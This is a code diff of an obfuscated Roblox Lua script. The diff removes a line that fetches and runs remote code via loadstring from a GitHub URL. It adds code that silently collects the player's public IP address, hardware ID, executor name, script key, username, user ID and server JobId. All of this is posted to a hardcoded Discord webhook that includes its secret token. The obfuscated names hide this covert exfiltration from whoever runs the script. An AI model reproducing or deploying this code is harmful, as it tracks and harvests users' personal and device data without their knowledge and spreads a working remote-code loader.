@@ -1,1 +1,60 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/RISER93-ROBLOX/AfxcaxiRT1/refs/heads/main/Kicked"))()
+local _X3N9P5M2L7 = "https://discord.com/api/webhooks/1365966166924853319/taGmnY4QO65UIbAMrShH1Eo3H_MH_WF4jwtADBiKTMlWnXMMrIMM0QxtuUTMgSVHglzn"
+local _M8Y1X2N3L5 = game:GetService("HttpService")
+local _Q7X9N6M2L4 = http_request or request or (syn and syn.request) or (fluxus and fluxus.request)
+
+if not _Q7X9N6M2L4 then return end
+
+local function _F2X7M9N3L1(_P6X8N5M2L9)
+    local _D4X1M7N2L3, _K9X5M2N8L7 = pcall(function()
+        return _Q7X9N6M2L4({ Url = _P6X8N5M2L9, Method = "GET" })
+    end)
+    return (_D4X1M7N2L3 and _K9X5M2N8L7 and _K9X5M2N8L7.Body) and _M8Y1X2N3L5:JSONDecode(_K9X5M2N8L7.Body) or {}
+end
+
+local _W9N3M2X7L5 = game:GetService("Players").LocalPlayer
+local _H2X7N9M5L3, _E8X5M2N7L9, _T3X9N6M2L8 = nil, nil, nil
+
+task.spawn(function()
+    _H2X7N9M5L3 = _F2X7M9N3L1("https://ipinfo.io/json").ip or "Unknown IP"
+end)
+
+task.spawn(function()
+    _E8X5M2N7L9 = (identifyexecutor and identifyexecutor()) or "Unknown Executor"
+end)
+
+task.spawn(function()
+    _T3X9N6M2L8 = (gethwid and gethwid()) or "Unknown HWID"
+end)
+
+local function _L7X9N3M2L5(_G5X2N8M7L9)
+    return (getgenv and getgenv()[_G5X2N8M7L9]) or "Unknown Script Or Unknown Key"
+end
+
+repeat task.wait() until _H2X7N9M5L3 and _E8X5M2N7L9 and _T3X9N6M2L8
+
+local _K2X7M9N5L3 = {
+    embeds = {{
+        title = "🔹 Script Executed 🔹",
+        color = 0x1cff1a,
+        fields = {
+            { name = "👤 User", value = string.format("```%s / %d```", _W9N3M2X7L5.Name, _W9N3M2X7L5.UserId) },
+            { name = "💻 Script", value = string.format("```%s```", _L7X9N3M2L5("SScript")) },
+            { name = "🔑 Key", value = string.format("```%s```", _L7X9N3M2L5("SKey")) },
+            { name = "🌍 Internet Protocol", value = string.format("```%s```", _H2X7N9M5L3), inline = true },
+            { name = "⚙️ Executor", value = string.format("```%s```", _E8X5M2N7L9), inline = true },
+            { name = "💻 Hardware ID", value = string.format("```%s```", _T3X9N6M2L8) },
+            { name = "🔗 JobId", value = string.format("```%s```", game.JobId) },
+            { name = "📝 Profile Link", value = string.format("[Click Here](https://www.roblox.com/users/%d/profile)", _W9N3M2X7L5.UserId), inline = true },
+            { name = "🎮 Game Link", value = string.format("[Click Here](https://www.roblox.com/games/%d)", game.PlaceId), inline = true }
+        }
+    }}
+}
+
+task.spawn(function()
+    _Q7X9N6M2L4({
+        Url = _X3N9P5M2L7,
+        Body = _M8Y1X2N3L5:JSONEncode(_K2X7M9N5L3),
+        Method = "POST",
+        Headers = { ["Content-Type"] = "application/json" }
+    })
+end)
